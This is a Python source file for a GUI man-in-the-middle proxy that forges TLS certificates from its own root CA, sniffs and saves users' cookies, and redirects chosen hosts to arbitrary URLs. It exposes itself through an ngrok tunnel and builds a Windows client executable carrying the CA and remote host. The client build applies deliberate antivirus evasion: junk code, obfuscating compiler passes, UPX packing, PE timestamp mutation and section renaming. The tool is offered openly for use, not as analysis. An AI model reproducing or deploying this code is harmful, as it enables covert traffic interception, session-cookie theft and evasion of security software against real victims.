
from __future__ import annotations
import contextlib
import datetime
import json
import logging
import queue
import re
import selectors
import shutil
import socket
import ssl
import subprocess
import sys
import threading
import time
from functools import lru_cache
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from socketserver import ThreadingMixIn
from typing import Dict, Tuple
from urllib.parse import urlparse
import fnmatch
import tkinter as tk
from tkinter import ttk
import requests

# Hide Windows console
if sys.platform == "win32":
    try:
        import ctypes
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
            ctypes.windll.kernel32.CloseHandle(hwnd)
    except Exception:
        pass

# Configuration
ROOT_DIR = Path(__file__).resolve().parent
DATA = ROOT_DIR / "data"
CERT_DIR = DATA / "leaf_certs"
for directory in (DATA, CERT_DIR):
    directory.mkdir(parents=True, exist_ok=True)

CA_KEY = DATA / "ca_key.pem"
CA_CERT = DATA / "ca_cert.pem"
COOKIES = DATA / "cookies.json"
HOST = "127.0.0.1"
PORT = 8080
BUF_SIZE = 512 * 1024

# Logging setup
logging.basicConfig(level=logging.INFO)
log = logging.getLogger("mitm")

# Regex for cookie sniffing
COOKIE_RE = re.compile(rb"cookie:\s*([^\r\n]+)", re.I)

# State for redirects and cookies
redirect_rules: list[Tuple[str, str, str]] = []
redir_lock = threading.Lock()
redir_enabled = False
cookie_sniffer = True
srv: HTTPServer | None = None

# TLS certificate generation helpers
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID

@lru_cache()
def root_ca() -> Tuple:
    if CA_KEY.exists() and CA_CERT.exists():
        key = serialization.load_pem_private_key(
            CA_KEY.read_bytes(), password=None
        )
        cert = x509.load_pem_x509_certificate(CA_CERT.read_bytes())
        return key, cert

    # Generate new CA key and self-signed cert
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Local MITM Proxy"),
        x509.NameAttribute(NameOID.COMMON_NAME, "Local MITM Proxy Root"),
    ])
    cert_builder = x509.CertificateBuilder()
    cert = (
        cert_builder
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime.utcnow() - datetime.timedelta(days=1))
        .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=3650))
        .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
        .sign(key, hashes.SHA256())
    )
    CA_KEY.write_bytes(
        key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
    )
    CA_CERT.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
    return key, cert

root_ca()

@lru_cache(maxsize=256)
def ssl_context_for(host: str) -> ssl.SSLContext:
    key, ca_cert = root_ca()
    pem_file = CERT_DIR / f"{host}.pem"
    key_file = CERT_DIR / f"{host}_key.pem"

    if not pem_file.exists():
        # Generate leaf certificate for host
        leaf_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        builder = x509.CertificateBuilder()
        leaf = (
            builder
            .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, host)]))
            .issuer_name(ca_cert.subject)
            .public_key(leaf_key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime.utcnow() - datetime.timedelta(days=1))
            .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=825))
            .add_extension(x509.SubjectAlternativeName([x509.DNSName(host)]), critical=False)
            .add_extension(x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]), critical=False)
            .sign(key, hashes.SHA256())
        )
        pem_file.write_bytes(leaf.public_bytes(serialization.Encoding.PEM))
        key_file.write_bytes(
            leaf_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            )
        )

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(str(pem_file), str(key_file))
    context.set_alpn_protocols(["http/1.1"])
    return context

# Cookie storage helpers

def load_cookies() -> Dict[str, Dict[str, str]]:
    try:
        return json.loads(COOKIES.read_text())
    except Exception:
        return {}

ck_store = load_cookies()

def save_cookies(store: Dict[str, Dict[str, str]]) -> None:
    try:
        COOKIES.write_text(json.dumps(store, indent=2))
    except Exception as e:
        log.error("Cookie save error: %s", e)

def store_cookies(host: str, header: str) -> None:
    if not cookie_sniffer:
        return
    pairs = dict(pair.split("=", 1) for pair in header.split("; ") if "=" in pair)
    domain_store = ck_store.setdefault(host, {})
    updated = False
    for k, v in pairs.items():
        if domain_store.get(k) != v:
            domain_store[k] = v
            updated = True
    if updated:
        save_cookies(ck_store)

# Redirect matching helpers

def normalize_host(host: str) -> str:
    return re.sub(r'^www\.', '', host.lower(), count=1)

def match_redirect(host: str, path: str) -> str | None:
    if not redir_enabled:
        return None
    host_norm = normalize_host(host)
    with redir_lock:
        for hp, pp, target in redirect_rules:
            if fnmatch.fnmatch(host_norm, normalize_host(hp)) and fnmatch.fnmatch(path, pp):
                log.info("Redirect %s%s → %s", host, path, target)
                return target
    return None

# Functions to send redirects

def send_plain_redirect(handler: BaseHTTPRequestHandler, target: str) -> None:
    handler.send_response(302)
    handler.send_header("Location", target)
    handler.send_header("Content-Length", "0")
    handler.send_header("Connection", "close")
    handler.end_headers()
    handler.close_connection = True

def send_tls_redirect(sock: ssl.SSLSocket, target: str) -> None:
    response = (
        f"HTTP/1.1 302 Found\r\n"
        f"Location: {target}\r\n"
        f"Content-Length: 0\r\n"
        f"Connection: close\r\n\r\n"
    )
    sock.sendall(response.encode())
    with contextlib.suppress(Exception):
        sock.shutdown(socket.SHUT_RDWR)

# Core proxy handler
class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _pipe(self, client_sock: socket.socket, server_sock: socket.socket, host: str) -> None:
        selector = selectors.DefaultSelector()
        selector.register(client_sock, selectors.EVENT_READ, server_sock)
        selector.register(server_sock, selectors.EVENT_READ, client_sock)
        buffer = bytearray(BUF_SIZE)

        while True:
            for key, _ in selector.select():
                src = key.fileobj
                dst = key.data
                try:
                    count = src.recv_into(buffer)
                except OSError:
                    return
                if count <= 0:
                    return

                if src is client_sock:
                    match = COOKIE_RE.search(buffer[:count])
                    if match:
                        store_cookies(host, match.group(1).decode('latin-1', 'ignore'))
                try:
                    dst.sendall(buffer[:count])
                except OSError:
                    return

    def _forward_request(self) -> None:
        host_header = self.headers.get("Host", "")
        host = host_header.split(":", 1)[0]
        path = urlparse(self.path).path or "/"

        # Check for redirect rule
        redirect_target = match_redirect(host, path)
        if redirect_target:
            send_plain_redirect(self, redirect_target)
            return

        # Serve CA certificate
        if self.command == "GET" and self.path == "/ca_cert.pem":
            cert_data = CA_CERT.read_bytes()
            self.send_response(200)
            self.send_header("Content-Length", str(len(cert_data)))
            self.send_header("Content-Type", "application/x-pem-file")
            self.end_headers()
            self.wfile.write(cert_data)
            return

        # Establish connection to upstream
        upstream_port = (
            int(host_header.split(":", 1)[1]) if ":" in host_header else 80
        )
        try:
            upstream = socket.create_connection((host, upstream_port), timeout=5)
        except OSError:
            self.send_error(502)
            return

        # Send request line & headers
        request_line = f"{self.command} {urlparse(self.path).path or '/'} {self.protocol_version}\r\n"
        if urlparse(self.path).query:
            request_line += f"?{urlparse(self.path).query}"
        headers = [request_line] + [f"{k}: {v}\r\n" for k, v in self.headers.items() if k.lower() != "proxy-connection"]
        headers.append("\r\n")
        upstream.sendall("".join(headers).encode('iso-8859-1'))

        # Send request body if present
        content_length = int(self.headers.get("Content-Length", "0") or 0)
        if content_length:
            upstream.sendall(self.rfile.read(content_length))

        # Pipe remaining data
        self._pipe(self.connection, upstream, host)

    def do_CONNECT(self) -> None:
        host, port_str = self.path.split(":", 1)
        port = int(port_str)

        try:
            upstream_sock = socket.create_connection((host, port), timeout=5)
        except OSError:
            self.send_error(502)
            return

        self.send_response(200)
        self.end_headers()

        # Wrap client side in TLS
        client_tls = ssl_context_for(host).wrap_socket(self.connection, server_side=True)
        # Wrap upstream side in TLS
        upstream_ctx = ssl.create_default_context()
        upstream_ctx.set_alpn_protocols(["http/1.1"])
        server_tls = upstream_ctx.wrap_socket(upstream_sock, server_hostname=host)

        try:
            preface = client_tls.recv(BUF_SIZE)
        except Exception:
            client_tls.close()
            server_tls.close()
            return

        # Handle HTTP/2 preface downgrade
        if preface.startswith(b"PRI * HTTP/2.0"):
            redirect_target = match_redirect(host, "/")
            if redirect_target:
                send_tls_redirect(client_tls, redirect_target)
                client_tls.close()
                server_tls.close()
                return

        # Determine path for redirect matching
        try:
            first_line = preface.split(b"\r\n", 1)[0].decode()
            m = re.match(r"[A-Z]+ (\S+) HTTP", first_line)
            path = urlparse(m.group(1)).path if m else "/"
        except Exception:
            path = "/"

        redirect_target = match_redirect(host, path)
        if redirect_target:
            send_tls_redirect(client_tls, redirect_target)
            client_tls.close()
            server_tls.close()
            return

        # Continue piping
        server_tls.sendall(preface)
        self._pipe(client_tls, server_tls, host)

# Bind HTTP methods to forwarding logic
for method in ("GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"):
    setattr(Handler, f"do_{method}", Handler._forward_request)

# Threaded HTTP server
class ThreadedHTTP(ThreadingMixIn, HTTPServer):
    daemon_threads = True
    allow_reuse_address = True

    def handle_error(self, request, client_address):
        err = sys.exc_info()[1]
        if isinstance(err, OSError) and getattr(err, "winerror", None) == 10038:
            return
        return super().handle_error(request, client_address)

# GUI components
class TkLogHandler(logging.Handler):
    def __init__(self, queue: queue.Queue):
        super().__init__()
        self.queue = queue

    def emit(self, record: logging.LogRecord) -> None:
        try:
            self.queue.put_nowait(self.format(record))
        except Exception:
            pass

class GUI:
    ICON_PATH = ROOT_DIR / "proxy_icon.png"

    def __init__(self) -> None:
        self.root = tk.Tk()
        self.root.title("MITM Proxy")

        if self.ICON_PATH.exists():
            try:
                img = tk.PhotoImage(file=str(self.ICON_PATH))
                self.root.iconphoto(False, img)
            except Exception:
                pass

        # Top frame for listener and build controls
        top_frame = ttk.Frame(self.root, padding=10)
        top_frame.grid(row=0, column=0, sticky="ew")
        top_frame.columnconfigure(6, weight=1)

        # Proxy listener controls
        ttk.Label(top_frame, text="Proxy Host").grid(row=0, column=0, padx=5)
        self.entry_host = ttk.Entry(top_frame, width=15)
        self.entry_host.insert(0, HOST)
        self.entry_host.grid(row=0, column=1, padx=5)

        ttk.Label(top_frame, text="Proxy Port").grid(row=0, column=2, padx=5)
        self.entry_port = ttk.Entry(top_frame, width=6)
        self.entry_port.insert(0, str(PORT))
        self.entry_port.grid(row=0, column=3, padx=5)

        self.button_start = ttk.Button(top_frame, text="Start", command=self.start)
        self.button_start.grid(row=0, column=4, padx=5)

        self.button_stop = ttk.Button(top_frame, text="Stop", command=self.stop, state=tk.DISABLED)
        self.button_stop.grid(row=0, column=5, padx=5)

        # Client build controls
        ttk.Label(top_frame, text="Client Host").grid(row=1, column=0, padx=5, pady=(10,0))
        self.entry_che = ttk.Entry(top_frame, width=15)
        self.entry_che.insert(0, HOST)
        self.entry_che.grid(row=1, column=1, padx=5, pady=(10,0))

        ttk.Label(top_frame, text="Client Port").grid(row=1, column=2, padx=5, pady=(10,0))
        self.entry_cpe = ttk.Entry(top_frame, width=6)
        self.entry_cpe.insert(0, str(PORT))
        self.entry_cpe.grid(row=1, column=3, padx=5, pady=(10,0))

        self.button_build = ttk.Button(top_frame, text="Build Client", command=self.build_client)
        self.button_build.grid(row=1, column=4, padx=5, pady=(10,0))

        self.button_ngrok = ttk.Button(
            top_frame,
            text="Start ngrok tunnel",
            command=lambda: self.start_ngrok(int(self.entry_port.get()))
        )
        self.button_ngrok.grid(row=1, column=5, padx=5, pady=(10,0))

        # Toggles
        self.ck_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(
            top_frame,
            text="Cookie sniffer",
            variable=self.ck_var,
            command=self.toggle_cookie
        ).grid(row=2, column=0, columnspan=3, sticky="w")

        self.rd_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(
            top_frame,
            text="Enable redirects",
            variable=self.rd_var,
            command=self.toggle_redirects
        ).grid(row=2, column=3, columnspan=3, sticky="w")

        # Redirect rule list
        middle_frame = ttk.Frame(self.root, padding=(10,5))
        middle_frame.grid(row=1, column=0, sticky="nsew")
        self.root.rowconfigure(1, weight=1)

        ttk.Label(middle_frame, text="Redirect rules (double-click to delete)").pack(anchor="w")
        self.listbox_rules = tk.Listbox(middle_frame, height=6)
        self.listbox_rules.pack(fill="both", expand=True, pady=5)
        self.listbox_rules.bind("<Double-1>", lambda e: self.delete_rule())

        # Add rule inputs
        bottom_frame = ttk.Frame(self.root, padding=10)
        bottom_frame.grid(row=2, column=0, sticky="ew")
        bottom_frame.columnconfigure(2, weight=1)

        ttk.Label(bottom_frame, text="Host pattern").grid(row=0, column=0)
        self.entry_hp = ttk.Entry(bottom_frame)
        self.entry_hp.grid(row=1, column=0, padx=5)

        ttk.Label(bottom_frame, text="Path pattern").grid(row=0, column=1)
        self.entry_pp = ttk.Entry(bottom_frame)
        self.entry_pp.grid(row=1, column=1, padx=5)

        ttk.Label(bottom_frame, text="Target URL").grid(row=0, column=2)
        self.entry_tg = ttk.Entry(bottom_frame)
        self.entry_tg.grid(row=1, column=2, padx=5, sticky="ew")

        ttk.Button(bottom_frame, text="Add", command=self.add_rule).grid(row=1, column=3, padx=5)

        # Log area
        ttk.Label(self.root, text="Log").grid(row=3, column=0, sticky="w", padx=10)
        self.text_log = tk.Text(self.root, height=10, bg="#111", fg="#eee")
        self.text_log.grid(row=4, column=0, sticky="nsew", padx=10, pady=(0,10))
        self.root.rowconfigure(4, weight=1)

        # Logging handler
        self.log_queue = queue.Queue()
        handler = TkLogHandler(self.log_queue)
        handler.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(message)s", "%H:%M:%S"))
        logging.getLogger().addHandler(handler)
        self.root.after(200, self.drain_log)

        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

    def start_ngrok(self, port: int) -> None:
        subprocess.Popen(
            ["ngrok", "tcp", str(port)],
            cwd=str(ROOT_DIR),
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        log.info("Starting ngrok TCP tunnel on port %d...", port)
        threading.Thread(target=self.fetch_ngrok_url, daemon=True).start()

    def fetch_ngrok_url(self) -> None:
        api_url = "http://127.0.0.1:4040/api/tunnels"
        for _ in range(20):
            try:
                resp = requests.get(api_url)
                tunnels = resp.json().get("tunnels", [])
                for tunnel in tunnels:
                    if tunnel.get("proto") == "tcp":
                        url = tunnel.get("public_url", "")
                        host, port_str = url.replace("tcp://", "").split(":")
                        log.info("Ngrok tunnel established: %s", url)
                        self.entry_che.delete(0, tk.END)
                        self.entry_che.insert(0, host)
                        self.entry_cpe.delete(0, tk.END)
                        self.entry_cpe.insert(0, port_str)
                        return
            except Exception:
                time.sleep(0.5)
        log.error("Failed to retrieve ngrok TCP tunnel info")

    def build_client(self) -> None:
        """
        Compile client.cpp → client.exe, embed CA + host/port, and apply
        multiple layers of obfuscation and evasion:
        1) preprocess: embed CA, host/port, add junk functions
        2) compile with clang++ obfuscator passes if available, else g++ with flags
        3) strip symbols
        4) UPX pack
        5) PE header timestamp mutation
        6) section renaming via lief
        7) overlay junk bytes
        """
        import random, string, shutil, subprocess, os, re, time, struct
        from pathlib import Path

        try:
            import pefile
        except ImportError:
            pefile = None

        try:
            import lief
        except ImportError:
            lief = None

        client_host = self.entry_che.get().strip()
        client_port = self.entry_cpe.get().strip()
        try:
            port_val = int(client_port)
        except ValueError:
            log.error("Invalid client port: %s", client_port)
            return

        src_file = ROOT_DIR / "client.cpp"
        build_dir = ROOT_DIR / "builds"
        build_dir.mkdir(exist_ok=True)

        # 1. preprocess client.cpp
        tmp_cpp = build_dir / "client_build.cpp"
        code = src_file.read_text(encoding="utf-8")

        # Insert random junk functions to break analysis
        junk = []
        for _ in range(random.randint(3, 6)):
            fname = ''.join(random.choices(string.ascii_lowercase, k=8))
            junk.append(f"void {fname}() {{ __asm__ volatile(\"\"); }}")
        code += "\n" + "\n".join(junk) + "\n"

        ca_pem = (DATA / "ca_cert.pem").read_text(encoding="utf-8")
        pem_literal = 'R"PEM(\n' + ca_pem + '\n)PEM"'

        code = re.sub(r'static const char\* embedded_ca = [^;]*;',
                      f'static const char* embedded_ca = {pem_literal};', code)
        code = re.sub(r'std::wstring host = L".*";',
                      f'std::wstring host = L"{client_host}";', code)
        code = re.sub(r'int port\s*= \d+;',
                      f'int port = {port_val};', code)

        tmp_cpp.write_text(code, encoding="utf-8")

        exe_path = build_dir / "client.exe"

        # 2. compile with obfuscation passes
        compiler = "clang++" if shutil.which("clang++") and shutil.which("opt") else "g++"
        if compiler == "clang++":
            compile_cmd = [
                "clang++",
                "-mllvm", "-fla",
                "-mllvm", "-bcf",
                "-mllvm", "-sub",
                "-std=c++17", "-municode",
                str(tmp_cpp), "-o", str(exe_path),
                "-lurlmon", "-lwininet", "-lshlwapi",
                "-lshell32", "-ladvapi32", "-lole32",
                "-mwindows"
            ]
        else:
            compile_cmd = [
                "g++", "-std=c++17", "-municode",
                "-s", "-fvisibility=hidden",
                "-fmerge-all-constants",
                "-ffunction-sections", "-fdata-sections",
                "-Wl,--gc-sections",
                str(tmp_cpp), "-o", str(exe_path),
                "-lurlmon", "-lwininet", "-lshlwapi",
                "-lshell32", "-ladvapi32", "-lole32",
                "-mwindows"
            ]

        try:
            subprocess.run(compile_cmd, check=True)
            log.info("Built client.exe at %s using %s", exe_path, compiler)
        except subprocess.CalledProcessError as e:
            log.error("Build failed: %s", e)
            return

        # 3. strip symbols
        for strip_tool in ("strip.exe", "strip"):
            if shutil.which(strip_tool):
                try:
                    subprocess.run([strip_tool, str(exe_path)], check=True)
                    log.info("Stripped symbols using %s", strip_tool)
                except Exception as e:
                    log.warning("Strip failed: %s", e)
                break
        else:
            log.warning("strip not found – skipping symbol stripping")

        # 4. UPX pack
        if shutil.which("upx"):
            try:
                subprocess.run(
                    ["upx", "-9", "--lzma", "--overlay=copy", str(exe_path)],
                    check=True
                )
                log.info("Packed with UPX")
            except Exception as e:
                log.warning("UPX packing failed: %s", e)
        else:
            log.warning("upx not found – skipping UPX packing")

        # 5. PE header timestamp mutation
        if pefile:
            try:
                pe = pefile.PE(str(exe_path))
                pe.FILE_HEADER.TimeDateStamp = random.randint(0, 0xFFFFFFFF)
                pe.write(str(exe_path))
                log.info("Mutated PE TimeDateStamp field")
            except Exception as e:
                log.warning("PE timestamp tweak failed: %s", e)
        else:
            log.warning("pefile not installed – skipping PE mutation")

        # 6. Rename PE sections
        if lief:
            try:
                binary = lief.parse(str(exe_path))
                for section in binary.sections:
                    section.name = ''.join(random.choices(string.ascii_letters, k=8))
                binary.write(str(exe_path))
                log.info("Renamed PE sections")
            except Exception as e:
                log.warning("Section renaming failed: %s", e)
        else:
            log.warning("lief not installed – skipping section renaming")

        # 7. overlay junk bytes
        try:
            overlay_len = random.randint(1024, 4096)
            with open(exe_path, "ab") as fh:
                fh.write(os.urandom(overlay_len))
            log.info("Appended %d random bytes to overlay", overlay_len)
        except Exception as e:
            log.warning("Overlay append failed: %s", e)

        log.info("✔ Build w/ enhanced obfuscation complete")

    def add_rule(self) -> None:
        host_pattern = self.entry_hp.get().strip()
        path_pattern = self.entry_pp.get().strip()
        target_url = self.entry_tg.get().strip()
        if host_pattern and path_pattern and target_url:
            with redir_lock:
                redirect_rules.append((host_pattern, path_pattern, target_url))
            self.entry_hp.delete(0, tk.END)
            self.entry_pp.delete(0, tk.END)
            self.entry_tg.delete(0, tk.END)
            self.refresh_rules()

    def delete_rule(self) -> None:
        selection = self.listbox_rules.curselection()
        if selection:
            index = selection[0]
            with redir_lock:
                redirect_rules.pop(index)
            self.refresh_rules()

    def refresh_rules(self) -> None:
        self.listbox_rules.delete(0, tk.END)
        with redir_lock:
            for hp, pp, tgt in redirect_rules:
                self.listbox_rules.insert(tk.END, f"{hp}{pp} → {tgt}")

    def toggle_cookie(self) -> None:
        global cookie_sniffer
        cookie_sniffer = self.ck_var.get()

    def toggle_redirects(self) -> None:
        global redir_enabled
        redir_enabled = self.rd_var.get()

    def drain_log(self) -> None:
        while not self.log_queue.empty():
            line = self.log_queue.get_nowait()
            self.text_log.configure(state=tk.NORMAL)
            self.text_log.insert(tk.END, line + "\n")
            self.text_log.see(tk.END)
            self.text_log.configure(state=tk.DISABLED)
        self.root.after(200, self.drain_log)

    def start(self) -> None:
        global srv
        if srv:
            return
        host = self.entry_host.get().strip()
        port = int(self.entry_port.get())
        srv = ThreadedHTTP((host, port), Handler)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        log.info("Listening on %s:%d", host, port)
        self.button_start.config(state=tk.DISABLED)
        self.button_stop.config(state=tk.NORMAL)

    def stop(self) -> None:
        global srv
        if not srv:
            return
        srv.shutdown()
        srv.server_close()
        srv = None
        log.info("Stopped proxy")
        self.button_start.config(state=tk.NORMAL)
        self.button_stop.config(state=tk.DISABLED)

    def on_close(self) -> None:
        self.stop()
        self.root.destroy()


if __name__ == "__main__":
    GUI().root.mainloop()
